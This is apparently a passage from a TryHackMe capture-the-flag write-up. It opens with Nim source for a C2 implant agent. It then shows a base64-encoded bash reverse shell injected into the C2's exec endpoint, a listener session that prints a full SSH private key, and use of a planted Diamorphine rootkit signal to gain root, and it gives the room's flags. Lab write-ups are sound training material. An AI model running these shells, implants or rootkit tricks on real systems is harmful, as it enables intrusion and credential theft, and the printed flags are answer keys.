import sequtils, random
from strutils import join, strip
include commands/[whoami, id, upload, pwd, download, exec, get_hostname]
import argparse
from nativesockets import getHostName
#import strenc

randomize()

# TESTING VARS
# var api_server = "http://localhost:8000/"
# const keyed_username = "husky"



const lowerCaseAscii = 97..122
const sleep_interval = 10000
const keyed_username = "c.oberst"
const api_server = "http://takedown.thm.local/"

# WEBSERVER vars
# const keyed_username = "webadmin-lowpriv"
# const api_server = "http://localhost:8888/"



# Argparse. Oh hey, there's a -v for ver mode! That's handy
var p = newParser:
    help("😂🐍🚀🚀🤫🎇🎇🎆🙏🔥❤️‍🔥💖💯👋👋👋💯❤️‍🔥💖🔥🔥🔥❤️‍🔥🤫🎇🎇🎆🎆🚀🍆")
    flag("-v", "--ver", help="")

var uid: string = ""

proc rand_str: string =
    4.newSeqWith(lowerCaseAscii.rand.char).join & "-" & 4.newSeqWith(lowerCaseAscii.rand.char).join & "-" & 4.newSeqWith(lowerCaseAscii.rand.char).join & "-" & 4.newSeqWith(lowerCaseAscii.rand.char).join    


# Server says: if the host headers do not contain [values], no soup for you! So let's include those pre-set values
const keyed_header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5"

# Check if the username of the user  is a specified value. If it is, run the agent. If not, nothing.
proc wake_up(key: string): bool =
    var res = strip(whoami())
    return key in res

# Initial check in and registration with server
proc initial_check_in(hostname: string): string =    
    # Create agent unique ID and POST to /api/agents/
    var uid = rand_str()
    
    try:
        var client = newHttpClient(userAgent = keyed_header)
        client.headers = newHttpHeaders({ "Content-Type": "application/json" })
        var body = %*{
            "uid": uid,
            "hostname": hostname
        }
        discard(client.request(api_server & "api/agents/register", httpMethod = HttpPost, body = $body))
    except:
        echo "🤣"
        quit(1)
    uid
    

# Check in with server and ask for commands
proc check_for_commands(): string =
    var client = newHttpClient(userAgent = keyed_header)
    let command_api = api_server & "api/agents/" & uid & "/command"
    let response = client.request(command_api, httpMethod = HttpGet)
    response.body

# Command handlers
proc command_handler(cmd: string): string =
    var split_cmd = cmd.split(" ")
    var run_cmd = split_cmd[0].strip()
    try:
        case run_cmd:
            of "whoami":
                result = whoami()
            of "exec":
                result = exec(cmd)
            of "id":
                result = id()
            of "upload":
                result = upload(split_cmd, uid, keyed_header, api_server)
            of "pwd":
                result = pwd()
            of "download":
                result = download(split_cmd, uid, keyed_header, api_server)
            of "get_hostname":
                result = get_hostname()
        return result
    except Exception as e:
        return "[x] Error: " & e.msg


# Send the results from a command
proc send_results(command_result: string): void =
    var client = newHttpClient(userAgent = keyed_header)
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    var body = %*{
                "results": command_result
        } 
    discard(client.request(api_server & "api/agents/" & uid & "/command", httpMethod = HttpPost, body = $body))



# Main
when isMainModule:
    try:
        let opts = p.parse()
        
        if opts.ver:
            echo "[*] Drone ready!"
        
        if opts.ver:
            echo "[*] Checking keyed username..."
        var is_keyed = wake_up(keyed_username)


        if not is_keyed:
            echo "🥺🥺😢😢😢😭😭😭😂😂🤣🤣"
            quit()
        else:
            if opts.ver:
                echo "[*] Key matches!"
            
            var hostname = getHostName()
            uid = initial_check_in(hostname)
            
            if opts.ver:
                echo "[*] My UID is: " & uid
                echo "[*] Hostname: " & hostname
            
            # Command loop
            while true:
                if opts.ver:
                    echo "[*] Checking for command..."
                
                var command = check_for_commands()
                if opts.ver:
                    echo "[*] Command to run: " & command
                
                var res = command_handler(command)
                if opts.ver:
                    echo "[*] Result: " & strip(res)
                
                send_results(strip(res))
                
                if opts.ver:
                    echo "[*] Sleeping: " & $sleep_interval
                sleep(sleep_interval)
    
    except ShortCircuit as e:
            if e.flag == "argparse_help":
                echo p.help
                quit(1)
    
    except UsageError:
        stderr.writeLine getCurrentExceptionMsg()
        quit(1)

bash -i >& /dev/tcp/10.8.19.103/443 0>&1

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy80NDMgMD4mMQ==

POST /api/agents/ilcn-qlob-ycju-wovt/exec HTTP/1.1

Host: takedown.thm.local

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.5

Connection: close

Content-Type: application/json

Content-Length: 102



{"cmd": "exec echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy80NDMgMD4mMQ== | base64 -d | bash"

}

HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 22:24:57 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 109

Connection: close

Access-Control-Allow-Origin: *



New commnad to execute: exec echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy80NDMgMD4mMQ== | base64 -d | bash

┌──(witty㉿kali)-[/home/c.oberst]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.195.24] 47558
bash: cannot set terminal process group (1861): Inappropriate ioctl for device
bash: no job control in this shell
webadmin-lowpriv@www-infinity:~$ whoami
whoami
webadmin-lowpriv

webadmin-lowpriv@www-infinity:~$ cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

webadmin-lowpriv@www-infinity:~$ cat user.txt
cat user.txt
THM{c2_servers_have_vulnerabilities_t00}


```

Enter the value of user.txt

*THM{c2_servers_have_vulnerabilities_t00}*

### Task 4  Root.txt

Enter the value of root.txt

Answer the questions below

```
webadmin-lowpriv@www-infinity:~$ cd /dev/shm
cd /dev/shm
webadmin-lowpriv@www-infinity:/dev/shm$ ls
ls
LICENSE.txt
Makefile
Module.symvers
README.md
diamorphine.c
diamorphine.h
diamorphine.ko
diamorphine.mod
diamorphine.mod.c
diamorphine.mod.o
diamorphine.o
modules.order
webadmin-lowpriv@www-infinity:/dev/shm$ cat README.md
cat README.md
Diamorphine
===========

Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31;

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisible;

- Source: https://github.com/m0nad/Diamorphine

Install
--

Verify if the kernel is 2.6.x/3.x/4.x/5.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder
```
cd Diamorphine
```

Compile
```
make
```

Load the module(as root)
```
insmod diamorphine.ko
```

Uninstall
--

The module starts invisible, to remove you need to make it visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod diamorphine
```

References
--
Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/

zizzu0 LinuxKernelModules
https://github.com/zizzu0/LinuxKernelModules/

Linux Rootkits: New Methods for Kernel 5.7+
https://xcellerator.github.io/posts/linux_rootkits_11/

https://github.com/m0nad/Diamorphine

webadmin-lowpriv@www-infinity:/dev/shm$ kill -64 0
kill -64 0
webadmin-lowpriv@www-infinity:/dev/shm$ id
id
uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
webadmin-lowpriv@www-infinity:/dev/shm$ cd /root
cd /root
webadmin-lowpriv@www-infinity:/root$ ls
ls
backstage
docker-compose
root.txt
rootkit
snap
takedown-dev-main
takedown-dev-main.zip
webadmin-lowpriv@www-infinity:/root$ cat root.txt
cat root.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*****(/****/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@#***&@/,,,,,,,,%@#***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&**#(,,,,,,,,,,,,*,,,,,@**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@(**/,,,,,,,,,,,,,,,,,,**,,,,/**@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%**,,,,,,,,,,,,#&@@%*,,,,,,***,,***@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/**,***,,,,(@/*********/@@,,,,****,**%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@*******,,,/*,*************,,/#,,,******#@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@******,,,,,,******************,,,,,******(@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@******,,,,,**&@@@@@****(@@@@@&***,,,,******%@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(*****,,,,/@@@@@@@@@@***@@@@@@@@@@**,,,******@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@*****,,,/@@@@*****%@****/@#****/@@@@/,,,*****/@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@(***,,,,@@@@@@@@@@@***(&(***@@@@@@@@@@@*,,,****@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@***,,,,@&&@@@@@@@%@@@@@@@@@@@#@@@@@@@#&@*,,,***%@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#**,,,,***@@@@@@@@@@@@@@@@@@@@@@@@@@@@%***,,,****@@@@@@@@@@@@@@@@@
@@@@@@@@@@&****,,,,***/@@@#@@@@@@/*****(@@@@@@%@@@/***,,,******@@@@@@@@@@@@@@@
@@@@@@@@@*******,,,,***@@@@(@@@@@******/@@@@@%@@@%***,,,,*******/@@@@@@@@@@@@@
@@@@@@@@&********,,,****@@@@@*&@@@@#*%@@@@%*@@@@%****,,,*********@@@@@@@@@@@@@
@@@@@@@@@@(********,,****#@@@@&***********@@@@@/****,,,********@@@@@@@@@@@@@@@
@@@@@@@@@@@@%*******,,*****&@(@(*********#@/@%*****,,*******/@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@/******,**,****#@(*******#@/****,**********&@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/******,,*****@@****/@@*****,,*******&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@#*****,,*****@@&@&*****,,*****(@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@/***,,***********,,***/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/**,,*****,,**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/,,,/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

THANKS FOR PLAYING :D -husky

THM{th3_r00t_of_the_pr0blem}
webadmin-lowpriv@www-infinity:/root$ ps -ef | grep diamorphine
ps -ef | grep diamorphine
root         629     616  0 20:55 ?        00:00:00 /usr/sbin/runuser -l webadmin-lowpriv -c /usr/share/diamorphine_secret/svcgh0st
webadmi+    1861     629  0 21:02 ?        00:00:01 /usr/share/diamorphine_secret/svcgh0st
root       10531   10461  0 22:28 ?        00:00:00 grep --color=auto diamorphine
webadmin-lowpriv@www-infinity:/root$ cd /usr/share/diamorphine_secret
cd /usr/share/diamorphine_secret
webadmin-lowpriv@www-infinity:/usr/share/diamorphine_secret$ ls
ls
svcgh0st

```

Enter the value of root.txt

*THM{th3_r00t_of_the_pr0blem}*

### Task 5  Made by HuskyHacks

Made with 💖 by HuskyHacks! Please let me know what you thought of the room.

🐦 Twitter: [https://twitter.com/HuskyHacksMK](https://twitter.com/HuskyHacksMK)

👾 GitHub: [https://github.com/HuskyHacks](https://github.com/HuskyHacks) 

📝 Notes/Blog: [https://notes.huskyhacks.dev/](https://notes.huskyhacks.dev/) 

Answer the questions below

Thanks for playing!

 Completed


[[Crocc Crew]]